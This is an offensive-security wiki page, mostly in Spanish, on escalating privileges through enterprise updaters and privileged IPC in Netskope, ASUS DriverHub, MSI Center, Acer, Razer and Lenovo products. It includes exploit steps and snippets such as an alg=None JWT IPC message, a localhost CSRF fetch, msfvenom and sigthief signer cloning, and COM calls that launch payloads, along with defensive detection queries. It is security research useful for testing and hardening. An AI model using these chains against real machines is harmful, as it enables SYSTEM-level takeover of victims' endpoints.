# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de local privilege escalation en Windows encontradas en enterprise endpoint agents y updaters que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con bajos privilegios puede forzar el enrollment en un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.

Ideas clave que puedes reutilizar contra productos similares:
- Abuse de la IPC localhost de un servicio privilegiado para forzar re-enrollment o reconfiguration hacia un servidor del atacante.
- Implementa los endpoints de update del vendor, entrega una Trusted Root CA maliciosa y apunta el updater a un paquete malicioso “signed”.
- Evade weak signer checks (CN allow-lists), optional digest flags y lax MSI properties.
- Si la IPC está “encrypted”, deriva la key/IV a partir de world-readable machine identifiers almacenados en el registry.
- Si el servicio restringe callers por image path/process name, inyecta en un proceso allow-listed o lanza uno suspended y arranca tu DLL con un minimal thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Muchos agents incluyen un proceso UI en user-mode que habla con un servicio SYSTEM sobre localhost TCP usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Crea un token JWT de enrollment cuyos claims controlen el backend host (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC invocando el provisioning command con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a golpear tu rogue server para enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Si la verificación del caller es path/name-based, origina la request desde un allow-listed vendor binary (ver §4).

---
## 2) Hijacking el update channel para ejecutar code como SYSTEM

Una vez que el client habla con tu server, implementa los endpoints esperados y redirígelo a un attacker MSI. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve JSON config con un updater interval muy corto, por ejemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA PEM. El servicio lo instala en el almacén Local Machine Trusted Root.
3) /v2/checkupdate → Proporciona metadata que apunta a un MSI malicioso y una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: el servicio puede solo comprobar que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad benigna del MSI llamada CERT_DIGEST. No se aplica enforcement en la instalación.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) desactiva la validación criptográfica extra.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

Patch-bypass lesson: si un vendor responde poniendo en allow-list un pequeño conjunto de dominios “trusted” en vez de autenticar criptográficamente la fuente de actualización, busca redirectors o reverse proxies propiedad del vendor que aún te permitan dirigir el tráfico. En el caso de Netskope, una investigación pública posterior mostró que un allow-list de la era R129 aún podía abusarse a través de `rproxy.goskope.com`, que hacía proxy de contenido de Azure App Service controlado por el atacante. Trata los hostname allow-lists como un speed bump, no como un trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Desde R127, Netskope envolvía el IPC JSON en un campo encryptData que parece Base64. El reverse engineering mostró AES con key/IV derivados de valores del registry legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un standard user. Consejo general: si un agent de repente “encrypts” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen contra binarios del vendor en allow-list ubicados bajo Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso en allow-list (e.g., nsdiag.exe) y proxy IPC desde dentro de él.
- Crear un binary en allow-list suspendido e iniciar tu proxy DLL sin CreateRemoteThread (ver §5) para cumplir las reglas de tamper impuestas por el driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Los productos suelen incluir un minifilter/driver de OB callbacks (e.g., Stadrv) para quitar derechos peligrosos de los handles a procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en user-mode fiable que respeta estas restricciones:
1) CreateProcess de un binary del vendor con CREATE_SUSPENDED.
2) Obtén handles que todavía puedas usar: PROCESS_VM_WRITE | PROCESS_VM_OPERATION en el proceso, y un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano, garantizado y mapeado) con un pequeño stub que llame a LoadLibraryW sobre la ruta de tu DLL, y luego vuelva.
4) ResumeThread para disparar tu stub dentro del proceso, cargando tu DLL.

Como nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (lo creaste tú), la policy del driver se cumple.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, la firma de un MSI malicioso, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un custom IPC client que crea mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la inyección en proceso suspendido para originarse desde un binary en allow-list.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Cuando te enfrentas a un nuevo endpoint agent o una suite “helper” de motherboard, un workflow rápido suele ser suficiente para saber si estás ante un objetivo prometedor de privesc:

1) Enumera los loopback listeners y mapea de vuelta a los procesos del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumera candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extrae datos de enrutamiento respaldados por el registro usados por servidores IPC basados en plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los nombres de endpoint, las claves JSON y los command IDs del cliente en user-mode. Los frontends empaquetados de Electron/.NET con frecuencia filtran el esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Busca el predicado de confianza real, no solo la ruta de código que finalmente lanza el proceso:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrones que vale la pena priorizar:
- `CryptQueryObject`/análisis de certificados sin `WinVerifyTrust` normalmente significa que “el certificado existe” fue tratado como “el certificado es de confianza”, permitiendo cloning de certificados u otros trucos de fake-signer.
- Las comprobaciones de subcadena/sufijo sobre `Origin`, `Referer`, URLs de descarga, nombres de proceso o CNs del signer no son autenticación. `contains(".vendor.com")` suele ser explotable con dominios parecidos controlados por el atacante.
- Si la GUI con menos privilegios decide “el archivo es trusted” y el broker SYSTEM solo consume ese resultado, parchear o reimplementar la DLL/JS del lado cliente a menudo bypassa por completo la frontera (validación dividida estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o lo agenda desde esa ruta, prueba de inmediato ventanas de reemplazo TOCTOU y módulos plugin hermanos que expongan wrappers alternativos `ExecuteTask()` con controles más débiles.

Para targets con mucho uso de named-pipe, PipeViewer es una forma rápida de detectar DACLs débiles y pipes accesibles de forma remota antes de empezar a reversar el protocolo en profundidad.

Si el target autentica a los callers solo por PID, ruta de imagen o nombre de proceso, trátalo como un tropiezo y no como una frontera: inyectar en el cliente legítimo, o hacer la conexión desde un proceso en allow-list, suele bastar para satisfacer los checks del servidor. Para named pipes específicamente, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) cubre el primitivo con más profundidad.

---
## 8) Modular add-in brokers autenticados solo por firmas de vendor (patrón Lenovo Vantage)

Una variación más nueva que vale la pena buscar es el **signed-client RPC broker**: un proceso de escritorio de Lenovo firmado y con pocos privilegios habla con un servicio SYSTEM, y el servicio enruta comandos JSON hacia un conjunto de add-ins descritos en XML bajo `%ProgramData%`. Una vez que se logra ejecución de código **dentro de cualquier signed client aceptado**, cada contrato `runas="system"` pasa a formar parte de tu superficie de ataque.

Primitivos de alto valor observados en investigaciones de Lenovo Vantage:
- **Confiar en el caller porque está firmado por el vendor**: investigadores llegaron a un contexto autenticado copiando un EXE firmado por Lenovo a un directorio escribible y satisfaciendo un DLL side-load (`profapi.dll`) para que código arbitrario se ejecutara dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de superficie de ataque guiado por manifest**: los add-ins se declaran bajo `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, así que enumerar esos manifests suele revelar los verbos privilegiados reales más rápido que reversar el broker en sí.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente confiable, la investigación pública encontró path-traversal + condiciones de carrera en verbos de update/install, abuso de raw-SQL en bases de datos de settings privilegiados, y comprobaciones de rutas del registry basadas en subcadenas que permitían writes fuera del hive previsto.

Recon útil en un target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Toma práctica: cada vez que una suite de helper expone un broker que primero autentica el **caller process** y solo después despacha a decenas de comandos de plugin/add-in, no te detengas tras saltarte la comprobación de confianza de la puerta de entrada. Volca la tabla de manifest/contract y haz fuzzing de cada verbo de alto privilegio por separado; el canal autenticado suele ocultar varios bugs de segunda etapa.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del browser procedentes de https://driverhub.asus.com. El filtro de origin simplemente aplica `string_contains(".asus.com")` sobre el encabezado Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Cualquier host controlado por un atacante como `https://driverhub.asus.com.attacker.tld` pasa por tanto la comprobación y puede emitir requests que cambian el estado desde JavaScript. Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para patrones adicionales de bypass.

Flujo práctico:
1) Registra un dominio que incruste `.asus.com` y aloja allí una webpage maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON esperado por el handler – el frontend JS empaquetado muestra el esquema de abajo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la CLI de PowerShell que se muestra a continuación tiene éxito cuando el encabezado Origin se suplanta con el valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el JSON body y los cachea en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la Download URL reutiliza la misma lógica de substring, así que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptado. Después de la descarga, ADU.exe solo comprueba que el PE contenga una signature y que el string del Subject coincida con ASUS antes de ejecutarlo – sin `WinVerifyTrust`, sin chain validation.

Para weaponize the flow:
1) Create un payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el signer de ASUS en él (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostea `pwn.exe` en un dominio parecido a `.asus.com` y dispara UpdateApp via el browser CSRF anterior.

Como tanto el Origin como los filtros de URL son basados en substring y la comprobación del signer solo compara strings, DriverHub descarga y ejecuta el binary del atacante bajo su contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente core (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el executable suministrado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature vía `CS_CommonAPI.EX_CA::Verify` (el certificate subject debe ser “MICRO-STAR INTERNATIONAL, CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una scheduled task que ejecuta el temp file como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar Frame A apuntando a un binary legítimo firmado por MSI (garantiza que la signature check pasa y la task queda en cola).
- Hacer race con mensajes Frame B repetidos que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando el scheduler se dispara, ejecuta el payload sobrescrito bajo SYSTEM a pesar de haber validado el archivo original. Una explotación fiable usa dos goroutines/threads que spamean CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado bajo `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a los atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` con **no signature validation** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Sniffing loopback con Wireshark o instrumentar los binaries .NET en dnSpy revela rápidamente el mapping Component ↔ command; clientes Go/ Python custom pueden luego replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su discretionary ACL permite clientes remotos (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar command ID `7` con una file path invoca la rutina del servicio que lanza procesos.
- La client library serializa un magic terminator byte (113) junto con args. La dynamic instrumentation con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para instrumentation tips) muestra que el native handler mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y un integrity SID antes de llamar a `CreateProcessAsUser`.
- Sustituir 113 (`0x71`) por 114 (`0x72`) cae en la generic branch que mantiene el token completo de SYSTEM y establece un high-integrity SID (`S-1-16-12288`). El binary lanzado, por tanto, se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combínalo con la exposed installer flag (`Setup.exe -nocheck`) para levantar ACC incluso en lab VMs y usar la pipe sin hardware del vendor.

Estos IPC bugs destacan por qué los servicios localhost deben imponer mutual authentication (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué cada helper de “run arbitrary binary” de un módulo debe compartir las mismas signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un user de baja privilegiación puede pedirle a un COM helper que lance un proceso mediante `RzUtility.Elevator`, mientras la trust decision se delega a una DLL en user-mode (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del privileged boundary.

Observed exploitation path:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar `LaunchProcessNoWait(<path>, "", 1)` para solicitar un elevated launch.
- En el public PoC, el gate de la PE-signature dentro de `simple_service.dll` se parchea antes de emitir la request, permitiendo que se lance un executable arbitrario elegido por el atacante.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway general: when reversing suites “helper”, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lanzando un instalador que no es de Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepte manifests sin firmar o que no ancle los signers del installer—network hijack + malicious installer + BYO-signed sideloading da lugar a remote code execution bajo la apariencia de actualizaciones “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
